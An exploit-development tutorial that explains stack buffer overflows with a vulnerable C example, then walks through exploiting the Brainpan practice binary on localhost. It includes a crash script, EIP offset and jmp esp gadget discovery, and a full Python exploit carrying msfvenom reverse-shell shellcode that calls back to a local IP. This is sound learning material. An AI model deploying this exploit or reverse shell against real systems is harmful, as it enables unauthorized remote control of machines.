## Stack Overflows

## What is a Stack Buffer Overflow?

A stack buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer on the stack than it was originally allocated to hold. Buffers are blocks of memory, typically arrays or character strings, that store temporary data. When a program doesn’t check the amount of data written to a buffer, it can overwrite other parts of the stack, which can cause unintended behavior, crashes, or security vulnerabilities.

In short, a stack buffer overflow happens when the data you’re writing exceeds the buffer’s allocated memory and begins to overwrite adjacent memory, potentially including the return address and local variables stored on the stack.

### Example of a Stack Buffer Overflow

Consider this C code:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *str) {
    char buffer[10];  // Allocate a small buffer of 10 bytes
    strcpy(buffer, str);  // Copy input into buffer without checking size
}

int main() {
    char *long_string = "This string is too long for the buffer!";
    vulnerable_function(long_string);
    return 0;
}
```

#### In this example:

1. The function vulnerable_function creates a buffer on the stack that can hold only 10 bytes.
2. The strcpy function copies the contents of long_string into buffer.
3. Since long_string is longer than 10 bytes, strcpy writes beyond the boundaries of buffer, causing a stack buffer overflow.

### Why Is a Stack Buffer Overflow Dangerous?

When the data overflows past the buffer, it overwrites nearby memory on the stack, which can include:

- Return addresses: Changing the return address can redirect the program’s execution flow, often to code provided by an attacker.
- Local variables and control structures: This can change the behavior of the function, possibly causing unexpected actions or program crashes.

### Exploiting a Stack Buffer Overflow

Attackers can exploit stack buffer overflows to inject and execute malicious code. Let’s break down how:

1. Controlling the Return Address: By carefully crafting the overflow data, an attacker can overwrite the return address with the memory address of their own malicious code.
2. Injecting Malicious Code: The attacker can place malicious code (often called shellcode) in memory, usually within the overflowed buffer.
3. Redirecting Execution: When the function returns, instead of returning to the caller, it jumps to the attacker’s code, effectively granting control over the program.

## Example of Exploitation

In this section we are going to exploit a binary called "Brainpan". You can download it here --> [brainpan.exe](/assets/binaries/brainpan.exe).

We have the following exploit template:

### Initial Crash

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 5000  # change me

payload = b"A" * CRASH_LEN

with socket.create_connection(target) as sock:
    sock.recv(512) 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")

```

We start clicking at the binary to execute it.

![](/assets/img/more_images/2024-10-25-1.png)

Don't forget to attach the debugger to it, in this case I will use "WinDbg". Attach it and send the payload.

![](/assets/img/more_images/2024-10-25-2.png)

We see that the "eip" is overwritten. We need to find an offset to overwrite the "eip" with our desired value. Using two metasploit modules (msf-pattern_create, msf-patter_offset) we can obtain that offset. The specific offset is "524".

Now, we have to jump to the "ESP", so we are going to use an interesting tool that help us to find some gadgets:

```powershell
.\rp-win-x86.exe -f ..\Preparation\1.stack_overflow\brainpan\brainpan.exe -r 5 > rop.txt
```

We check the rop.txt file:

![imagen](https://github.com/user-attachments/assets/b599dc57-6c94-4058-a73b-a9698012c3f6)

Bingo! We have the "jmp esp" address. We include it in out exploit and we add a padding of several "nops" to let the msfvenom shellcode to decode the badchars in execution.

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 5000 
OFFSET = 524

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xdb\xd6\xd9\x74\x24\xf4\xbb\x4c\x44\x20\xf7"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17"
shellcode += b"\x83\x8e\x40\xc2\x02\xf2\xa1\x80\xed\x0a\x32"
shellcode += b"\xe5\x64\xef\x03\x25\x12\x64\x33\x95\x50\x28"
shellcode += b"\xb8\x5e\x34\xd8\x4b\x12\x91\xef\xfc\x99\xc7"
shellcode += b"\xde\xfd\xb2\x34\x41\x7e\xc9\x68\xa1\xbf\x02"
shellcode += b"\x7d\xa0\xf8\x7f\x8c\xf0\x51\x0b\x23\xe4\xd6"
shellcode += b"\x41\xf8\x8f\xa5\x44\x78\x6c\x7d\x66\xa9\x23"
shellcode += b"\xf5\x31\x69\xc2\xda\x49\x20\xdc\x3f\x77\xfa"
shellcode += b"\x57\x8b\x03\xfd\xb1\xc5\xec\x52\xfc\xe9\x1e"
shellcode += b"\xaa\x39\xcd\xc0\xd9\x33\x2d\x7c\xda\x80\x4f"
shellcode += b"\x5a\x6f\x12\xf7\x29\xd7\xfe\x09\xfd\x8e\x75"
shellcode += b"\x05\x4a\xc4\xd1\x0a\x4d\x09\x6a\x36\xc6\xac"
shellcode += b"\xbc\xbe\x9c\x8a\x18\x9a\x47\xb2\x39\x46\x29"
shellcode += b"\xcb\x59\x29\x96\x69\x12\xc4\xc3\x03\x79\x81"
shellcode += b"\x20\x2e\x81\x51\x2f\x39\xf2\x63\xf0\x91\x9c"
shellcode += b"\xcf\x79\x3c\x5b\x2f\x50\xf8\xf3\xce\x5b\xf9"
shellcode += b"\xda\x14\x0f\xa9\x74\xbc\x30\x22\x84\x41\xe5"
shellcode += b"\xe5\xd4\xed\x56\x46\x84\x4d\x07\x2e\xce\x41"
shellcode += b"\x78\x4e\xf1\x8b\x11\xe5\x08\x5c\xde\x52\x13"
shellcode += b"\xa0\xb6\xa0\x13\xc2\xc3\x2c\xf5\x98\xdb\x78"
shellcode += b"\xae\x34\x45\x21\x24\xa4\x8a\xff\x41\xe6\x01"
shellcode += b"\x0c\xb6\xa9\xe1\x79\xa4\x5e\x02\x34\x96\xc9"
shellcode += b"\x1d\xe2\xbe\x96\x8c\x69\x3e\xd0\xac\x25\x69"
shellcode += b"\xb5\x03\x3c\xff\x2b\x3d\x96\x1d\xb6\xdb\xd1"
shellcode += b"\xa5\x6d\x18\xdf\x24\xe3\x24\xfb\x36\x3d\xa4"
shellcode += b"\x47\x62\x91\xf3\x11\xdc\x57\xaa\xd3\xb6\x01"
shellcode += b"\x01\xba\x5e\xd7\x69\x7d\x18\xd8\xa7\x0b\xc4"
shellcode += b"\x69\x1e\x4a\xfb\x46\xf6\x5a\x84\xba\x66\xa4"
shellcode += b"\x5f\x7f\x86\x47\x75\x8a\x2f\xde\x1c\x37\x32"
shellcode += b"\xe1\xcb\x74\x4b\x62\xf9\x04\xa8\x7a\x88\x01"
shellcode += b"\xf4\x3c\x61\x78\x65\xa9\x85\x2f\x86\xf8"


payload = b"A" * OFFSET
payload += struct.pack("<L",0x311712f3) # JMP ESP
payload += b"\x90" * 10
payload += shellcode
payload += b"C" * (CRASH_LEN - len(payload))

with socket.create_connection(target) as sock:
    sock.recv(512) 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")

```
